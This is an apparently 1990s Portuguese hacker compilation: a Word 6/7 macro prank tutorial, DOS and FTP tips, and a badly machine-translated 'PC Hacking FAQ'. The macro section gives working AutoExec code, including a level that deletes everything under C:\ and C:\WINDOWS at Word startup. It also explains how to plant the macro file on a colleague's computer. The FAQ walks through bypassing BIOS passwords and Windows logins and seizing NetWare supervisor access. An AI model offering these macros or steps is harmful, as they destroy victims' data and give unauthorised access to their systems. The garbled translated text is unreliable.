4.1 - Vírus

      Vírus é um programa independente que se auto reproduz. Ele irá se aclo-
par em outros programas e fazer cópias de si mesmo espalhando-se pelo win-
chester. O intuito do vírus é destruir o corruptar informações do disco rígi-
do ou baixar o rendimento do micro rodando programas maiores que a memória
disponível. Antivírus, só retiram os vírus que eles forem programados. Nenhum
programa pode o proteger 100 % de vírus, pois a cada momento estão sendo fa-
bricados novos vírus em qualquer parte do mundo.

4.2 Trojan Horse (Cavalo de Tróia)

      O cavalo de tróia é um programa que, como o vírus, se aclopa em um 
arquivo do winchester de um microcomputador infectado. Eles tem o intuito de
roubar informações preciosas como passwords ou logins e, depois, enviá-las a
seu "dono"pela network automaticamente. Alguns antivírus retiram os Trojans
outros não, mas nenhum retira todos.

Worm

      Worm é o tipo de programa mais inteligente já criado. Ele não só se 
espalha pelo computador e espera pela sorte de infectar outro através de um
disquete contaminado, ele tem o poder de se espalhar por toda a network. Os
worms podem infectar toda uma rede de sistemas e fazer nelas um bom estrago.

Vírus de Macro

Ainda hoje existe  muita gente que so eh  capaz de abrir o  word,  editar,
  negritar, sublinhar e  mandar  para impressora, muitos, milhares so sabem
  mexer  no basico  mesmo. Eles nem  imaginam o  que  tem  por  traz  deste
  riquissimo processador de texto.

  Esta materia tem como objetivo fazer desde pequenas ate grandes sacanagens
  com usuarios pentelho.

  ps: Software/versao Abrangido: Word da Microsoft, versoes 6 (win3.11) e
  7.0 (win95)


  O Word  possui  um  arquivo  chamado  "normal.dot"  onde  estao  todas  as
  configuracoes padrao do word.Se por algum motivo este arquivo for deletado
  o Word cria automaticamente quando for inicializado.

  Niveis de sacanagem
  Nivel 1..... Apenas uma brincadeira
  Nivel 2..... Apenas uma brincadeira de mau gosto
  Nivel 3..... Nao eh mais brincadeira.

  Primeiro voce precisa criar uma macro... siga os passos:
  Entre no Word, feche a  janela de  documento, nao deixe  nenhum documento
  aberto(ativo), clique em Arquivo(File) depois  Macro, coloque  no nome da
  macro "AutoExec"(obrigatorio) esta  macro eh  inicializada toda vez que o
  Word for iniciado, depois  clique em 'Criar', delete  as duas  linhas que
  tiver la (Sub MAIN e End Sub) e cole a  rotina que  tem logo mais abaixo.

  ps: existe outras formas/meios d criar uma macro,mas esta eh mais simples.


  * Nivel 1
  O nivel 1 serve  para voce se mostrar, falando que entende do Word melhor
  do que ninguem.
  Cada vez que  o usuario  inicia o Word recebera uma mensagem... de  alerta
  ou qquer outro coisa que sair da sua mente. veja abaixo.

  v------[corte aqui-begin]-------v
  Sub MAIN
  MsgBox "Voce é um pentelho!  Eu não irei prosseguir com o sistema", "Microsoft Word", 5
  MsgBox "Usuário Pirata Detectado", "FATAL ERROR", 16
  MsgBox "JAMES BOND 007 ", "007 na estrada Digital", 64
  End Sub
  ^------[corte aqui-end]-------^


  - Nivel 2
  Eh para deixar o usuario irritadissimo.
  no corpo da macro cole este texto abaixo:

  v-----[corte aqui-begin]-------v
  Sub MAIN
  ArquivoNovoPadrão
  Inserir "James"
  ArquivoNovoPadrão
  Inserir "Bond"
  ArquivoNovoPadrão
  Inserir "007"
  ArquivoNovoPadrão
  Inserir "James Bond 007 Na Estrada digital "
  ArquivoNovoPadrão
  Inserir "."
  ArquivoNovoPadrão
  Inserir "."
  ArquivoNovoPadrão
  Inserir "."
  ArquivoNovoPadrão
  Inserir "."
  ArquivoNovoPadrão
  Inserir "."
  ArquivoNovoPadrão
  Inserir "."
  ArquivoNovoPadrão
  Inserir "."
  ArquivoNovoPadrão
  Inserir "."
  ArquivoNovoPadrão
  Inserir "."
  ArquivoNovoPadrão
  Inserir "."
  ArquivoNovoPadrão
  Inserir "."
  ArquivoNovoPadrão
  Inserir "."
  ArquivoNovoPadrão
  Inserir "."
  ArquivoNovoPadrão
  Inserir "."
  ArquivoNovoPadrão
  Inserir "James Bond 007 Na Estrada digital "
  End Sub
  ^------[corte aqui-end]-------^

  Repita as linhas

    ArquivoNovoPadrão
    Inserir "."

  Quantas vezes quiser, pois o resultado sera dezenas de arquivos aberto,
  irritando o usuario, com a mensagem de falta de memoria.
  ps: acho que o limite eh de 69 arquivos aberto, depente muito do conteudo
  dos arquivos, de for somente '.' acho que da no maximo 69 arquivos.


  - Nivel 3
  Bom este nivel eh  pura sacanagem,com ele um simples clicar* do mouse, e
  tudo desaparece! isto  mesmo "del *.*" ou apenas os documentos, voce  eh
  quem sabe.

  v-----[corte aqui-begin]-------v
  Sub MAIN
  Kill "C:\*.*"
  Kill "C:\WINDOWS\*.*"
  Kill "C:\WINWORD\*.*"
  End Sub
  ^-----[corte aqui-end]-------^


  Lembre-se de que estes macros, sao gravado no arquivo default do word, ou
  seja  no  'normal.dot'  se  este   arquivo  for   deletado, o  Word  cria
  automaticamente na inicializacao,entao se voce for fazer estas sacanagens
  ai acima, proteja este arquivo, com o comando 'attrib +r'.

  Detalhes:
  . Existe uma forma de iniciar o Word, sem q inicialize a macro 'AutoExec'
    mas nao irei falar, descubra voce mesmo.
  . A macro do word eh uma ferramenta riquissima, procure fucar.
  . Voce  pode  fazer  estas no  seu proprio  computador(so cuide!), salvando
    sempre no arq. "normal.dot"  depois copie apenas este arquivo para aquele
    seu colega/amigo pentelho e saie de perto, para nao explodir em voce.
  . Nao me responsabilizo por qquer ato.



Dicas

	Bem, chegamos a melhor parte. Nesta seção eu tentei colocar bastante dicas, algumas dicas e tirei de bíblias hackers(em inglês), e traduzi com um programa tradutor, portanto, pode não haver certas concordâncias, porque herrar ê umanu.

DOS
  - Compactador PKZIP - Alguns comandos para quem AINDA nao sabe.
    para compactar com senha
    # pkzip nome *.* -sSENHA     (observe q a opcao -s tem q estar
                                  junto/grudada com sua senha)
    para descompactar:
    # pkunzip nome.zip -sSENHA

    para compactar sub-diretorios
    # pkzip nome *.* -p -r

    para descompactar e abrir o(s) subdiretorio(s)
    # pkunzip nome.zip -d

                                ---

  INTERNET(1)
  - se seu provedor nao tiver um servidor se newsgroup proprio, vc pode
    acessar a este de uso publico 'news.rdc.puc-rio.br'

                                ---

  Windows95/Internet
  - o windows95 possui um prog. de FTP para DOS. ou seja vc pode entrar
  em servidores FTP em modo caracter, como se estivesse usando o proprio
  unix. Quando vc estiver conectado a rede, abra uma secao DOS e
  digite FTP mais o endereco, ex: 'ftp 200.248.224.10'
  depois de conectado digite '?' para ver os comandos, para lista-los
  use 'dir' - para puxar/baixar arq's use o comando 'mget' mais o arquivo
  e para mandar use o 'mput' seguido o arquivo.
  mensagem/exemplo:

  c:\windows>ftp 200.255.216.5
  Connected to 200.255.216.5.
  220 net FTP server (Version wu-2.3(1) Tue Dec 24 23:51:15 CST 1993) ready.
  User (200.255.216.5:(none)): anonymous
  Password:
  ...



  INTERNET(2)
  - Alguns servidores para visitar:
    FTP
    Provedor   -> 200.248.215.210
    Provedor   -> 200.248.224.10
    Banco Itau -> 200.246.143.1
    ...        -> 200.246.45.1
    ...        -> 129.29.64.246

    TELNET
    Nyx        -> 130.253.192.68


    ps: para acessar os servidor FTP utilize como user 'anonymous' e a senha
        varia: uns eh soh dar um ENTER e outros eh soh colocar 'joao@'
        em seguida teclar ENTER.


                     ==------------------== 
                       O PC Hacking FAQ 
                     ==------------------== 

                      Versão 1.5 3/17/96 

----------------------------------------------------------------Escrito Por 
Olcay Cirit, <olcay@libtech.com>----------------------------------------------------------------RETRATAÇÃO: O autor deste texto nega toda a 
obrigação tudo que relativo ao and/or de uso abuse das técnicas esboçadas aqui 
ou qualquer dano incorreram thereof diretamente ou indiretamente.  


                       Índice 
                     - = - = - = - = - = - = - = - = - = - = - 
                  X. Introdução 
                  1. Hardware e Firmware 
                      um. O BIOS 
                           Contra-senhas 
                           Resetting o CMOS 
                      b. Fechaduras moles 
                           Os escolhendo 
                           Os comprando 
                      c. Por último Recursos 
                           Extração de disco rígido 
                  2. DOS, Windows, e Netware 
                      um. Acesso adquirindo para DOS 
                           Calce as botas de um disquete 
                           Arquivos de startup de estrada de contorno 
                           Evite DriveSpace 
                           Fuja de Autoexec.bat 
                      b. Passando De Windows 
                           Filtre os Poupadores 
                           Proteção de contra-senha 
                           DOS Usando Escrevem  
                           DOS Using Palavra 
			   DOS por MODO 
                      c. Passando De Netware 
                           Nomes de Conta comuns 
                           Resetting Netware 
                  3. Construindo um sistema seguro 
                      um. Entendendo os Assuntos 
                           Hackers " potencial " 
                           Segurança física 
                           Segurança de software 
                           Contra-senhas 

---------------------------------------------------------------- 

X. Introdução 

Este FAQ descreve como para rombo para um PC (IBM-compatível)  
do exterior em, e como evitar a maioria software-baseado 
medidas de segurança. A última seção detalha como afiançar seu 
PC contra tal ataca. 

Hi e Ho é vai fora para: KORO o Grande, Neil Chou, John,  
Lundgren e esses Netware Hackers realmente fresco! [Parte 2c (Adquirindo  
Netware passado) está baseado em partes do Netware Hacking FAQ!] 

Por que eu escrevi isto? Porque há pouco havia tantos  
perguntas em alt.2600 que concernem ' Como faça eu passo de XXXXX  
segurança? ' que eu me cansei de responder cada um  
individualmente. Espere ver para este FAQ se expandir como eu acho mais  
bichos e buracos em software de segurança. 

Muitas destas soluções assumem você tem acesso físico para 
o PC. Por exemplo, você não pode extrair o disco rígido ou 
reajuste o CMOS em cima de uma cadeia, mas você pode fazer isto se você 
tenha acesso ao computador. 

Este FAQ é *NOT * escrito para ajudar thiefs de computador, mas bastante 
é pretendido que aumenta consciência de backdoors e 
inefficiencies em programas de segurança. Eu não TOLERO  
ESTRAGANDO OUTROS COMPUTADORES de PEOPLES' NADA!!!!!!  

Talvez depois do ler para isto não confie o non-existente  
segurança oferecida como muito por Windows 95. 

Eu gostaria de notar que poucos destes truques é novo. Eu 
simplesmente reunido tudo o que eu poderia achar e  
o no qual eu poderia respigar de experiência pessoal um 
arquivo organizado. 

Se você tem qualquer pergunta ou comentários, sinta livre para me contactar. 

Também, espere ver uma versão disto para o Macintosh, 
algum dia... :) 

	Tenha Phun, 

	Olcay Cirit, <olcay@libtech.com>  
	a.k.a, Pensamento Fundo, 

---------------------------------------------------------------- 

1. Hardware e Firmware 

1a. O BIOS 

Contra-senhas 
== == == == = 
O BIOS, pequeno para Serviços de Input/Output Básicos, é o programa de controle 
do PC. É responsável para começar seu computador e transfere controle do 
sistema para seu sistema operacional, e  
por dirigir outras funções de baixo nível, como acesso de disco. 

NOTA que o BIOS não é um programa de software, insofar como é 
não purgado de memória quando você vira o computador. É  
firmware, só é permanentemente e unchangeably armazenaram em 
a máquina. 

Uma pequena característica conveniente que a maioria dos fabricantes de BIOS 
inclui 
é uma contra-senha de startup. Isto previne acesso para o sistema até 
você entra na contra-senha correta.  

Se você pode adquirir acesso para o sistema depois da contra-senha foi entrado, 
então há numerosos BIOS contra-senha extratores software-baseados disponível 
de: 

ftp://oak.oakland.edu/simtel/msdos/sysutil/amis2990.zip 


Resetting o CMOS 
== == == == == == == == == 
Há só um outro modo para passar da contra-senha de BIOS.  
Envolve descarregando a memória estática (CMOS) armazenava a contra-senha e 
outra informação de sistema. Uma vez é descarregado,  
porém, você tem que reajustar todas as colocações de sistema à mão. 

* * * *Follow estes passos: 

	 1. Comece o computador 
		um. Se o sistema permite isto, entre na Tela de Ligação 
			(Normalmente apertando F1, DEL ou INS durante  
			o cheque de memória) 
		b. Registre toda a Informação de Ligação. Cheque dobro. 
	 4. Vire o computador 
	 5. Remova a cobertura, e ponha o computador no solo em 
		tal um modo que você pode ver e pode ter acesso o lado de  
		o motherboard com o processador nisto. 
	 6. Olhe o motherboard.  
		um. Se você pode ver um círculo, disco-como bateria, então, 
			remova, e deixe o computador se sentar sem  
			a bateria durante 15-30 minutos. Ponha a bateria  
			atrás em. 
		b. Se você tem acesso ao circuito esquematiza para o 
			motherboard, olhe neles para a contra-senha ou 
			Saltador de CMOS. Sacuda de tempo em tempo. 
		c. Procure um azul, soldar-em bateria com um saltador 
			escapando disto. Este saltador é por conectar 
			uma bateria externa. Arranque para reajustar o 
			CMOS. 
	 9. Substitua a cobertura de computador. 
	10. Entre na Tela de Ligação, e fixe a Informação de Ligação 
		atrás para os valores originais que você (esperançosamente) 
		registrado. Se você estivesse impossibilitado registrar este info, 
		então você há pouco terá que montar isto manualmente. 
		[NOTA: Alguma Tomada mais nova & Jogo BIOSes têm um  
		característica de autodetect que automaticamente jogo-para cima o 
		disco rígido. Olhe ao redor de nos artigos de cardápio no 
		Ligação de BIOS.] 

Novamente, eu gostaria de mencionar que há numerosos extratores de contra-senha 
disponível para livre fora o internet e em BBSes. Tente esses primeiro. Eles 
estão muito mais limpos e fácil-para-usam. 

---------------------------------------------------------------- 

1b. Fechaduras moles 

Fechaduras moles são inserções de plástico geralmente baratas nas que engancham 
 
para o dentro do passeio e fecha isto e lhe impede assim de usar o passeio 
mole. As fechaduras usadas normalmente são esses pequeno 
rode fechaduras usadas em coberturas de computador para fechar o teclado. 

Se a fechadura é o rode tipo, você ou pode escolher isto, ou 
compre uma chave (eles são todos o mesmo). 

Para escolher isto, você precisará de um *thin * chave de fenda de flathead 
ou um paperclip. Escolher a fechadura, leve o paperclip e insira no pequeno 
entalhe no lado de dentro do rode fechadura. Agora, puxe ao lado oposto da 
fechadura até o rode está na posição destrancada. 

Se você escolhe comprar uma chave, você pode: 

	Um. Vá para seu centro de serviço de computador local, e compra 
		um destas chaves. (Muito barato. Freqüentemente menos que 
		$0.75) 
	B. Compre a mesma marca de fechadura mole, e use a chave 
		isso vem com isto. 

---------------------------------------------------------------- 

1c. Por último Recursos 

Se você é *REALLY * desesperado a rombo para este PC, então,  
o *might seguinte * trabalho: 

	1. Remova a Cobertura de PC 
	2. Extraia o disco rígido (desparafusando e desconectando) 
	3. Transfira para outro computador. (Tem certeza que é 
		Não fixe como o passeio de bota.) 
	4. Comece este computador, e tenha acesso o 
		disco rígido de lá. 

Isto provavelmente não trabalhará se um sistema de arquivo codificado é em 
uso. O único modo para ter acesso tais discos é entrar na contra-senha,  
ou entende um modo para decifrar isto, assim se você esquece de sua 
contra-senha, você é hosed. : ( 

---------------------------------------------------------------- 

2. DOS, Windows, e Netware 

2a. Acesso adquirindo para DOS 

Com alguns sistemas, eles são diretamente fixos até bota para algum tipo  
de programa de shell/security, como Windows, ou Windows 95. Se você 
queira adquirir acesso para um lembrete de DOS, você tem algumas escolhas: 

	Um. Calce as botas de um disquete 
	B. Arquivos de startup de estrada de contorno 
        C. DriveSpace evitando 
	D. Fuja de Autoexec.bat 

* * *Booting de um disquete lhe exige que crie um disco de sistema.  
Você pode fazer isto usando o DOS comando FORMATO /S que vai  
formate um disco e lugar arquivos de sistemas nisto. Também, o Windows  
formato tem uma opção que lhe permite criar um disquete de sistema. 

Antes de você crie um disco de sistema, você tem que determinar que 
passeio mole é usado para calçar as botas. Se o sistema tem ambos um 
1.2MB (5.25 ") Passeio mole e uns 1.44MB (3.5 ") Dirija, é provável 
que o passeio de bota é o 1.2 MB passeio mole. Se o computador 
tem só um passeio mole, está bastante seguro assumir que é 
o passeio de bota. 

Porém, se você é inseguro sobre qual passeio é o passeio de bota, 
você ou pode descobrir entrando em Ligação De sistema (como descreveu 
em seção 1) ou observando qual passeio mole é lido direito 
antes das cargas de sistema operacional. 

Se o sistema é fixado só calçar as botas do disco rígido, então você, 
possa se referir a Seção 1 em como reajustar o CMOS. 

Uma vez você tem um disco de sistema, você coloca isto no passeio mole, 
e vira em ou reajustou o computador. Se você fez tudo 
corrija, o computador calçará as botas do passeio mole e você vai 
tenha acesso a um lembrete de DOS. 

* * *Bypassing startup arquivos são bastante simples, mas só trabalha em  
versões de DOS 6.0 ou melhor e Windows 95. Quando você vira em  
o computador e você vêem o texto: 

	MS-DOS começando... 

ou 
	PC-DOS começando... 

ou  
	Windows 95 começando... 

Imprensa e segura a TROCA ou F5 chave IMEDIATAMENTE. Isto evitará  
o startup arquiva (CONFIG.SYS e AUTOEXEC.BAT) contanto que o  
administrador de sistema não incapacitou esta característica. 

Adicionalmente, você pode apertar e pode segurar F8 quando o startup  
texto mostra para entrar no cardápio de Bota. Isto o deixa selectively 
incapacite certos comandos, ou evite o startup totalmente arquiva, 
entre outras coisas. 

* * *Bypassing DriveSpace trabalha se software de compressão como DriveSpace ou 
DoubleSpace foi instalado. Nesse caso, quando 
o texto de startup exibe, imprensa e segura Ctrl+F5 ou Ctrl+F8. 
Isto carregará o sistema sem carregar a compressão 
motorista que o quer dizer não pode ter acesso os arquivos em disco.  

PORÉM, você pode descompressar o disco (DriveSpace só), ou, 
se todo outro falha, formate. 

* * *Breaking fora de AUTOEXEC.BAT também é bastante simples. Quando o 
computador começa e o sistema operacional começa carregando, imprensa 
Ctrl+Break (Ou Ctrl+C) repetidamente. Quando o AUTOEXEC.BAT executa, isto 
terminará isto e o derrubará para DOS. Isto trabalhará a menos que 
o administrador De sistema temporariamente inválido o teclado. 

---------------------------------------------------------------- 

2b. Obtendo a DOS de Windows 

Se as acima de táticas falham, e a máquina automaticamente cargas 
Windows, então você ainda tem uma chance de adquirir a DOS. Windows 
através de falta dá você livra acesso para DOS. Há segurança especial programa 
para impedir para o usuário de ter acesso DOS. A maioria destes 
pode ser evitado. 

Filtre os Poupadores 
== == == == == == = 
A proteção de contra-senha embutido a Windows 3.1 é extremamente fraco. 
Você pode evitar isto editando CONTROL.INI simplesmente e procurando  
o campo de Contra-senha. Apague o jogue fora isso aparece depois o igual 
sinal. 

A proteção de contra-senha em Windows 95 é muito mais forte, mas você ainda 
pode evitar isto por *carefully * movendo ou mencionando novamente todos os 
arquivos de .PWL  
no diretório de C:\Windows. 

Proteção de contra-senha 
== == == == == == == == == = 

Q: Windows começa, e você é apresentado com contudo outro  
	caixa de diálogo de contra-senha. O que faço eu? 

Um: 
* *If estes é o Windows Logon Primário ou um logon de Cadeia, então você 
normalmente pode passar disto apertando o botão de Cancelamento (Nenhuma 
Piada!). 
Isto é porque a informação de Logon é principalmente usada para preferência de 
mesa e arquivo compartilhar distante. 

* *If este é um programa de segurança de terço-festa, como o um embutido para 
Depois de Escuridão, tente Ctrl+Alt+Del urgente quando o diálogo é 
apresentado a você. A maioria para o que programas de segurança saem do modo 
deles/delas 
esteja seguro, e Windows 3.1 interpreta isto como não respondendo  
o sistema, e assim permitirá você fecha isto. Windows 95 aparece 
uma pequena caixa de diálogo limpa que o deixa termina qualquer aplicação de 
funcionamento. Como conveniente. :) Uma vez você subverte isto, você pode 
impeça do aborrecer novamente editando a CARGA = e  
CORRA = seções em C:\WINDOWS\WIN.INI. 

Q: Windows começa, e o gerente de programa carrega, mas o cardápio de Arquivo 
	é inválido, e assim é DOS e Gerente de Arquivo. Como possa eu tenho acesso 
	DOS??? 

Um: Há muitos programas de Segurança para Windows (3.1 *AND * 95) isso  
	faça isto, e outras coisas. Há alguns modos ao redor deles: 

* *Try este primeiro:  

DOS por Escreva 
== == == == == == == == = 
	1. Entre em Acessórios, e começe o Word  (ou Wordpad) 
		NÃO, eu não REPITO, NOTEPAD!! 
	2. abra C:\COMMAND.COM 
	3. Um pouco caixa de diálogo aparecerá. Não selecione NENHUMA CONVERSÃO 
	4. Selecione Economize Como... 
	5. Salve como C:\WINDOWS\WINHELP.EXE 
	6. Se pergunta que se você quer escrever elaboradamente WINHELP.EXE, escolhe 
		SIM 
	7. Aperte F1. Normalmente, isto carrega Ajuda de Windows, mas agora isto 
		crie um DOS janela pronta. 

* *Try este próximo: 

DOS por Palavra 
== == == == == == == == 
	1. Se eles têm Palavra de Microsoft instalada, começa. 
	2. Do Cardápio de Ferramentas, Macro seleto. 
	3. Digite em um nome de Macro, e clique " Crie " 
	4. Quando a janela de Macro surge, digite em um do 
		seguindo dependendo em qual Windows que você está usando: 

		  Para Windows 3.1: Concha Environ $(COMSPEC ")  
		  Para Windows 95: Concha Environ $(" COMANDO ")  
		  Para Windows NT: Concha Environ $(CMD ") 

		Se todo outro faltas: Concha " C:\COMMAND.COM " 

	5. Corra o macro apertando o pequeno botão de jogo no 
		toolbar de macro. Isto lançará um lembrete de DOS. 

* *If você está usando Windows 95, tente isto: 

DOS por MODO 
== == == == == == == == 
Quando Windows 95 Fecha e espetáculos que gráfico mudo, é 
realmente há pouco se sentando em cima de DOS. Você pode emitir DOS de fato 
comandos (embora o gráfico os cobrirá) no sistema  
depois de paralisação de empresas!! 

Um modo simples para fazer isto é digitar: 

CLS 

Depois que os espetáculos gráficos. Porém, o texto estará em 40-column 
modo que é duro ler e incompatível com alguns programas. 

Se você quer adquirir um lembrete de DOS agradável, limpo, você pode digitar: 

	MODO CO80 

Este testamento reajustou a exibição de tela para normal (80-column,  
16 cor) modo. 

Desde *MOST * Windows Segurança programas estão baseado em um VxD, eles,  
será descarregado (junto com Windows) depois de paralisação de empresas, 
partindo  
você livra para explorar usando DOS. 

---------------------------------------------------------------- 

2c. Passando de NetWare 

Esta seção está baseado em excerto do Netware Hacking FAQ. 

Nomes de Conta comuns 
== == == == == == == == == == 
Novell Netware tem as contas de falta seguintes: SUPERVISOR, CONVIDADO, e 
Netware 4.x tem ADMIN e USER_TEMPLATE como bem. Tudo estes não têm nenhum jogo 
de contra-senha. Só um bobo deixaria o SUPERVISOR e ADMIN considera 
desprotegido, assim você pode bem não como prova. Porém, muitos administradores 
criarão contas de especial-propósito que têm fácil-para-suposição nomeia, 
alguma sem contra-senha nada. Aqui está alguns do comum e os propósitos típicos 
deles/delas: 

Propósito de conta 
---------------------------------------------------------- POSTO que Prende a 
um segundo servidor para email 
CORREIO 

IMPRESSÃO que Prende a um segundo servidor por imprimir 
LASER 
HPLASER 
IMPRESSORA 
LASERWRITER 

ESCAVADOR que Prende um escavador de email ao servidor 

Maio POSTERIOR tem restrições de password/station (veja abaixo), WANGTEK		usado 
por apoiar o servidor a uma unidade de fita 
		prendido ao workstation. Para auxilio completos,  
		Equivalência de supervisor é requerida. 

TESTE UM usuário de teste responda por uso de temp 

ARQUIVISTA Palindrome omite conta para auxilio 

CHEY_ARCHSVR Uma conta para Arcserve para login para o servidor de     		do 
consolo para auxilio de fita. Versão 5.01g's 
		contra-senha era TERRA MARAVILHOSA. 

PORTAL que Prende uma máquina de portal ao servidor 
PORTÃO 

FAC-SÍMILE que Prende uma unidade de modem de fac-símile dedicada à cadeia 
FAXUSER          
FAXWORKS         

WINDOWS_PASSTHRU Embora não exigido, pela Microsoft Win95 		Recurso Kit, Ch. 9 
pg. 292 e Ch. 11 pg. 401 você 
		precise disto para recurso que compartilha sem uma contra-senha. 



Resetting Netware 
== == == == == == == == = 
Quando NetWare é instalado primeiro, o SUPERVISOR de conta e CONVIDADO 
permanece desprotegido, quer dizer, sem contra-senha. SUPERVISOR tem 
corrida grátis do sistema. Você pode fazer qualquer coisa que você quer. 

Mas como possa você faz o servidor pensar que há pouco foi instalado sem 
reinstalar o servidor de fato e perder todos os dados em  
o disco? Simples. Você há pouco apaga os arquivos que contêm o  
sistema de segurança!  

Em Netware 2.x, toda a informação de segurança é armazenada em dois arquivos 
(NET$BIND.SYS e NET$BVAL.SYS). Netware 3.x lojas que informação em três 
arquivos (NET$OBJ.SYS, NET$VAL.SYS e NET$PROP.SYS). O todo o Netware novo 4.x 
lojas de sistema todo o login nomeia e contra-senhas em cinco arquivos 
diferentes (PARTITIO.NDS, BLOCK.NDS, ENTRY.NDS, VALUE.NDS,  
e UNINSTAL.NDS [Este último arquivo pode não estar lá, não preocupa]). 

Embora Novell fez um mesmo trabalho bom que codifica contra-senhas, eles 
deixaram toda a informação de diretório fácil de achar e mudar se você pode ter 
acesso o disco do servidor diretamente e pode usar utilidades comuns como o 
Disco de Norton Edite.  

Usando esta utilidade como um exemplo, eu darei um passo por passo procedimento 
para fazer estes arquivos desaparecer. Tudo você necessidade é um bootable 
disco de DOS, o Disco de Emergência de Utilidades de Norton que contém o 
DiskEdit programa e algum tempo perto do servidor. 

1. Calce as botas em o servidor e vai para o lembrete de DOS. Fazer isto, há 
pouco deixe a cadeia normalmente e então calçar as botas use o ABAIXE e 
comandos de SAÍDA. Este procedimento não trabalha em Netware velho 2.x 
servidores e em algumas instalações onde DOS foi removido de memória. Nesses 
casos, você terá que usar um DOS bootable disco. 

2. Corra a utilidade de DiskEdit de Norton de passeio UM: 

3. Ferramentas " seletas " no cardápio principal e então Configuração " seleta 
".  
   À janela de configuração, uncheck o " checkbox Somente de leitura ". E tem 
muito cuidado com tudo você digita depois deste ponto. 

4. Objeto " seleto " e então " Passeio ". À janela, selecione o C: dirija e 
tenha certeza você confere o botão " passeio " físico. Isso você estará 
cuidando a seu disco físico e você pode ver  
   (e mudança) tudo nisto. 

5. Ferramentas " seletas " e então " Achado ". Aqui, você entrará no nome do 
arquivo que você está tentando para achar. Use " NET$BIND " para Netware 2, 
NET$PROP.SYS " para Netware 3 e " PARTITIO.NDS " para Netware 4. É possível que 
você ache estes fios em um lugar que não é o diretório de Netware. Se os nomes 
de arquivo não são todos perto de um ao outro e proportionaly separaram por 
alguns códigos ilegíveis (pelo menos 32 bytes entre eles), então você não é o 
lugar para o que nós estamos olhando. Naquele caso, você terá que continuar 
procurando selecionando " Ferramentas " e então " Achar novamente ". [Em 
Netware 3.x, pode mudar você todo o occurences da oficina de encadernação 
arquiva e ainda deveria trabalhar aprovadamente]) 

6. Você achou o diretório e você está pronto mudar isto. Em vez de apagar os 
arquivos, você estará os mencionando novamente. Isto evitará problemas com o 
diretório estruture (gosta de cadeias GORDAS perdidas). Só tipo " VELHO " em 
cima do SYS " existente " ou " extensão de NDS ". Tenha extremamente cuidado e 
não mude qualquer outra coisa. 

7. Ferramentas " seletas " e então " Acha novamente ". Considerando que Netware 
armazenam a informação de diretório em dois lugares diferentes, você tem que 
achar a outra cópia e mudar isto o mesmo modo. Isto prevenirá problemas de 
estrutura de diretório novamente. 

8. Encerre Disco de Norton Edite e calce as botas em o servidor novamente. Se 
você está correndo Netware 2 ou 3, seu servidor já seria acessível. Há pouco vá 
para qualquer estação e anote em como Supervisor de usuário. Nenhuma 
contra-senha será perguntada.     Se você está correndo Netware 4, há um último 
passo. 

9. Carregue Netware 4 instalam utilidade (só CARGA de tipo INSTALA ao lembrete 
de consolo) e seleciona as opções para instalar os Serviços de Diretório. Você 
sido incitado para a contra-senha de Admin enquanto fazendo isto. Isso você 
pode perseguir para qualquer estação e pode anotar em como usuário Admin, 
usando a contra-senha que você selecionou. 

* *NOTE: Se Disco Edita é indisponível, qualquer Disco que Edita utilidade com 
capacidades buscadoras bastarão. 

---------------------------------------------------------------- 


3. Construindo um sistema seguro 

3a. Entendendo os Assuntos 

Hackers " potencial " 
== == == == == == == == == = 
Depois de ler este FAQ, você revisou sua idéia provavelmente de um 
PC seguro bastante. Verdade contada, a IBM não projetou o Computador Pessoal 
com segurança em mente. Atrás em 1980, o objetivo principal deles/delas era 
adquirir _something_ para comercializar antes de Maçã engoliu toda a parte de 
mercado. 

Depois de por algum tempo, programas de segurança começaram a emergir isso 
tentado 
atravessar este buraco. Estes eram bastante populares, e foi posto em uso 
por muitas companhias prevenir ' os empregados de curious' de desarrumar com 
os computadores. 

Porém, modos para evitar estes foram achados programas de segurança depressa. 
Contanto que sejam projetados computadores para conveniência, e com humanos 
em mente, acontecerá quase sempre isto. 

Assim, quem são Hackers " potencial "? A resposta é: Qualquer um. Usuários 
experientes especialmente, mas newbies plano às vezes acham manchas fracas. 
Isto 
é não dizer que todo o mundo *is * um hacker. 

Como sempre, prevenção é o melhor medicamento. As seções seguintes 
negocie com como afiançar seu sistema, ambos por meios físicos e 
software-baseados. 



Segurança física 
== == == == == == == == = 
Nos dias velhos, atrás quando computadores encheram quartos múltiplos, a 
segurança de um sistema era basicamente todo física: Fechaduras, segurança 
guarda, etc. Agora a ênfase trocou longe de segurança física, e está apoiando 
mais para métodos software-baseados. Porém,  
em alguns casos, um certo grau de segurança física está em ordem. 

* *If você quer prevenir as pessoas de resetting seu CMOS e  
tendo acesso os passeios moles, etc. você tem que afiançar o próprio sistema. 
Isto pode ser feito tendo o computador em um quarto fechado e pode ser deixado 
só a tela e teclado acessível. Há muitos produtos que o deixaram estendem o 
alcance de tela e cabos de teclado.  Até mesmo alguns que o deixaram controlam 
muitos computadores diferentes que usam uma tela.  

* * *To protegem seus dados de disco rígido, eu sugestionaria investindo em um 
sistema de mídia removível que o " deixa quente-troca " e discos rígidos de 
fechadura.  O disco rígido poderia ser removido então facilmente (com o *unique 
* chave) 
e armazenou em uma caixa forte para prevenir roubo de dados. 

* * *Computer fecha que liga seu computador a uma escrivaninha é bom para 
desencorajar roubo. 

* * *There também são dispositivos de segurança disponível fez através de 
companhias como Bloco de Âncora, Lucasey, e outros que completamente incluem o 
PC.   
Estes são dispositivos como blocos de lockdown, cabos para monitores, e caixas 
de metal. Também há dispositivos que cobrem e fecham o disquete  
e aberturas de CD-ROM.   

Tenha certeza que você testa o computador imediatamente depois destes 
são instalados dispositivos de lockdown. Em algumas instâncias induziu a tensão 
na cobertura certas partes podem causar a mau funcionamento. 

* * *You pode comprar dispositivos dos que previnem o PC corda elétrica  
unplugged sendo ou virou em sem uma chave. 

* * *As uma última medida de segurança, sempre é agradável investir em 
um pouco de seguro para seu computador. Não voltará seus dados, 
mas isto *will * lhe dê um pouco de paz de mente. 


Segurança software-baseada 
== == == == == == == == == == == = 
Debaixo de é uma lista de medidas você pode levar para afiançar métodos 
baseados para seu software/firmware usando de sistema. Eles são listados em 
ordem de segurança crescente, segurança tão mínima estaria implementando só 
opção #1, segurança de máximo estaria implementando #1-8. Detenha 
mente que implementando quaisquer destes sem implementar todo artigo debaixo 
disto deixa para possíveis pontos de entrada abre. 

	1. Monte uma contra-senha de BIOS para ambos a tela de Ligação *and * 
	   tenha acesso ao sistema. 
		um. Tenha certeza a contra-senha não é facilmente nenhum guessable 
			(i.e., birthdate, nomeie para trás, etc. é 
			 facilmente adivinhado) Veja próxima seção. 
